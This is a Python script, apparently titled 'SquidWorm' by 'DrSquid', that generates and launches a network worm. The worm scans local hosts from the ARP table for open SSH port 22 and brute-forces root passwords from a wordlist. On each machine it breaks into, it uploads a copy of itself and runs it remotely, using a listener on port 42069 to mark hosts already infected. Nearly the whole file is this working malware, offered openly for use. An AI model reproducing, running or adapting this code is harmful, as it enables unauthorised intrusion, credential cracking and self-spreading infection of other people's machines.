from optparse import OptionParser
import os, sys

class OptionParse:
    def __init__(self):
        if len(sys.argv) < 2:
            self.usage()
        else:
            self.get_args()
    def genscript(self):
        script = """
import paramiko, os, socket, threading, sys, time
print('''
   _____             _     _     __          __                    __   ___  
  / ____|           (_)   | |    \ \        / /                   /_ | / _ \ 
 | (___   __ _ _   _ _  __| |_____\ \  /\  / /__  _ __ _ __ ___    | || | | |
  \___ \ / _` | | | | |/ _` |______\ \/  \/ / _ \| '__| '_ ` _ \   | || | | |
  ____) | (_| | |_| | | (_| |       \  /\  / (_) | |  | | | | | |  | || |_| |
 |_____/ \__, |\__,_|_|\__,_|        \/  \/ \___/|_|  |_| |_| |_|  |_(_)___/ 
            | |                                                              
            |_|                                                              
Script By DrSquid
This worm Spreads over local networks and exploits port 22.''')
class Marker:
    def __init__(self, ip="0.0.0.0", port=42069):
        self.ip = ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.ip, self.port))
        self.listener = threading.Thread(target=self.listen)
        self.listener.start()
    def listen(self):
        while True:
            try:
                self.sock.listen()
                conn, ip = self.sock.accept()
                time.sleep(1)
                conn.send("I have been infected with a worm.".encode())
                conn.close()
            except:
                pass
class Worm:
    def __init__(self, filetobecloned,victimfilename,passw_file,cfg_file=None):
        self.own_ip = "192.168.0.115"
        self.cfg_file = cfg_file
        self.has_cfg = False
        if self.cfg_file != None:
            self.cfg_contents, self.ls_contents = self.cfg(self.cfg_file)
        self.os_ls = ['windows','apple','linux']
        self.ips = os.popen('arp -a').readlines()
        self.possiblevictims = self.identify_victims()
        self.passwords_cracked = 0
        self.passwords_scanned = 0
        self.clonefile = filetobecloned
        self.fileonvictim = victimfilename
        self.passw_file = passw_file
        self.victims = []
        self.ips_scanned = 0
        print(f"[+] List of Possible Hosts: {self.possiblevictims}")
        print("[+] Do CRTL+C To stop the script.")
        print("\\n[+] Initiating Port Scan.....")
        self.passwords = self.obtain_passw()
        self.port_scanner = threading.Thread(target=self.begin_port_scan)
        self.port_scanner.start()
    def cfg(self, filename):
        file = open(filename, "r")
        contents = file.read()
        file.close()
        file = open(filename, "r")
        ls_contents = file.readlines()
        file.close()
        if "CFGFORWORM" in contents:
            self.has_cfg = True
            print("[+] A Config file has been provided.")
            return contents, ls_contents
        else:
            return None
    def initiate_threads(self):
        self.laster = threading.Thread(target=self.output_item)
        self.laster.start()
        while True:
            try:
                if self.ips_scanned == len(self.possiblevictims):
                    if len(self.victims) == 0:
                        print("\\n[+] No Hosts with Port 22 Open.")
                    else:
                        for ip in self.victims:
                            if self.has_cfg:
                                if ip in self.cfg_contents:
                                    if ip not in self.victims:
                                        print(f"[+] {ip} is in config file, but not in victim list.\n[+] Ignoring.........")
                                    else:
                                        for line in self.ls_contents:
                                            if ip in line:
                                                try:
                                                    ipcfg = line.split()
                                                    try:
                                                        username = ipcfg[1]
                                                    except:
                                                        username = "root"
                                                    try:
                                                        opsys = ipcfg[2]
                                                        if opsys not in self.os_ls:
                                                            opsys = "windows"
                                                    except:
                                                        opsys = "windows"
                                                except:
                                                    pass
                                else:
                                    username = "root"
                                    opsys = "windows"
                            else:
                                username = "root"
                                opsys = "windows"
                            victim = threading.Thread(target=self.victimlogin, args=(ip, username, opsys))
                            victim.start()
                    break
            except:
                pass
    def begin_port_scan(self):
        for ip in self.possiblevictims:
            try:
                print(f"\\n[+] Scanning {ip}.....")
                portscanner = threading.Thread(target=self.port_scan, args=(ip,))
                portscanner.start()
            except:
                pass
        self.initiate_threads()
    def port_scan(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 22))
            self.victims.append(ip)
            print(f"\\n[!] {ip} has 22 as an open Port.")
        except:
            print(f"\\n[+] {ip} does not have 22 as an open port.")
        s.close()
        self.ips_scanned += 1
    def obtain_passw(self):
        with open(self.passw_file, "r") as file:
            passwords = file.readlines()
        return passwords
    def identify_victims(self):
        victims = []
        if sys.platform == "win32":
            for lines in self.ips:
                try:
                    line = lines.split()
                    ip = line[0]
                    checker = int(ip[0])
                    victims.append(ip)
                except:
                    pass
        elif sys.platform == "darwin":
            for lines in self.ips:
                try:
                    line = lines.split()
                    ip = line[1]
                    ip = ip.strip('()')
                    checker = int(ip[0])
                    victims.append(ip)
                except:
                    pass
        return victims
    def output_item(self):
        while True:
            try:
                pass
            except:
                pass
    def victimlogin(self, ip, username="root", opsys="windows"):
        infected = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,42069))
            msg = s.recv(1024).decode()
            s.close()
            infected = True
            self.passwords_cracked += 1
            self.passwords_scanned += 1
            print(f"[!] {ip} has already been infected!")
        except:
            infected = False
        if not infected:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print(f"[+] Attempting to Brute Force Password for IP: {ip}")
            flag = 0
            for password in self.passwords:
                try:
                    password = password.strip()
                    client.connect(ip, 22, username, password, auth_timeout=2)
                    flag = 1
                    break
                except:
                    pass
            if flag == 1:
                self.passwords_cracked += 1
                self.passwords_scanned += 1
                print(f"\\n[!] {ip}'s Password has been Cracked!: {password}")
                print(f"[!] Injecting file {self.clonefile} into Victim!")
                sftp = client.open_sftp()
                if opsys == 'apple':
                    sftp.put(self.clonefile, f"/Users/{username}/{self.fileonvictim}")
                    sftp.put(self.passw_file, f"/Users/{username}/{self.passw_file}")
                    if self.has_cfg:
                        sftp.put(self.cfg_file, f"/Users/{username}/{self.cfg_file}")
                    print(f"[!] Successfully Started {self.clonefile} On {ip}")
                    print(f"[+] If there is anything wrong with the connection, use: 'ssh {username}@{ip}' and procceed with: '{password}'")
                    if self.fileonvictim.endswith('.py'):
                        stdin, stdout, stderr = client.exec_command(
                            f"python3 /Users/{username}/{self.fileonvictim}")
                        stdin.close()
                    else:
                        stdin, stdout, stderr = client.exec_command(f"open /Users/{username}/{self.fileonvictim}")
                        stdin.close()
                else:
                    sftp.put(self.clonefile, f"C:/Users/{username}/{self.fileonvictim}")
                    sftp.put(self.passw_file, f"C:/Users/{username}/{self.passw_file}")
                    if self.has_cfg:
                        sftp.put(self.cfg_file, f"C:/Users/{username}/{self.cfg_file}")
                    print(f"[!] File May Have been started on {ip}(Cmd command may have not been passed).")
                    print(f"[!] You can try logging into the Computer with cmd: ssh {username}@{ip}")
                    print(f"[!] And proceed with Password: {password}")
                    if self.fileonvictim.endswith('.py'):
                        stdin, stdout, stderr = client.exec_command(
                            f"python3 C:/Users/{username}/{self.fileonvictim}")
                        stdin.close()
                    else:
                        stdin, stdout, stderr = client.exec_command(f"start /B C:/Users/{username}/{self.fileonvictim}")
                        stdin.close()
                client.close()
            else:
                print(f"\\n[?] {ip}'s Password was unable to be cracked.")
                self.passwords_scanned += 1
marker = Marker()
worm = Worm("""+self.filename+""", """+self.filename+""", """+self.passlist+""", """+self.config+""")
        """
        return script
    def usage(self):
        print("""
   _____             _     _     __          __                    __   ___  
  / ____|           (_)   | |    \ \        / /                   /_ | / _ \ 
 | (___   __ _ _   _ _  __| |_____\ \  /\  / /__  _ __ _ __ ___    | || | | |
  \___ \ / _` | | | | |/ _` |______\ \/  \/ / _ \| '__| '_ ` _ \   | || | | |
  ____) | (_| | |_| | | (_| |       \  /\  / (_) | |  | | | | | |  | || |_| |
 |_____/ \__, |\__,_|_|\__,_|        \/  \/ \___/|_|  |_| |_| |_|  |_(_)___/ 
            | |                                                              
            |_|                                                              
Worm By DrSquid
This worm Spreads over local networks and exploits port 22.

[+] Option-Parsing Help:
[+] --pL, --passlist - Specifies the Brute-Forcing SSH File.
[+] --cF, --config   - Specifies the config file for customized brute forcing.
[+] --fN, --filename - Specifies the name of the file created once brute forcing is successful.

[+] Note: The file that goes onto the remote computer will be the worm.

[+] Optional Arguements:
[+] --i,  --info   - Shows this message.

[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("[+] python3 SquidWorm.py --pL <passlist> --fN <filename> --cf <cfgfile>")
            print("[+] python3 SquidWorm.py --i")
        else:
            print("[+] SquidWorm --pL <passlist> --fN <filename> --cf <cfgfile>")
            print("[+] SquidWorm --i")
    def get_args(self):
        self.opts = OptionParser()
        self.opts.add_option("--pL","--passlist",dest="passlist")
        self.opts.add_option("--cF","--config",dest="config")
        self.opts.add_option("--fN","--filename",dest="filename")
        self.opts.add_option("--i","--info",dest="info",action="store_true")
        args, opt = self.opts.parse_args()
        if args.info is not None:
            self.usage()
        else:
            pass
        if args.passlist is None:
            self.usage()
        else:
            self.passlist = args.passlist
        if args.config is None:
            self.config = None
        else:
            self.config = args.config
        if args.filename is None:
            self.filename = "Worm.py"
        else:
            self.filename = args.filename
        script = self.genscript()
        file = open(self.filename,"w")
        file.write(script)
        file.close()
        os.startfile(file.name)
optionparse = OptionParse()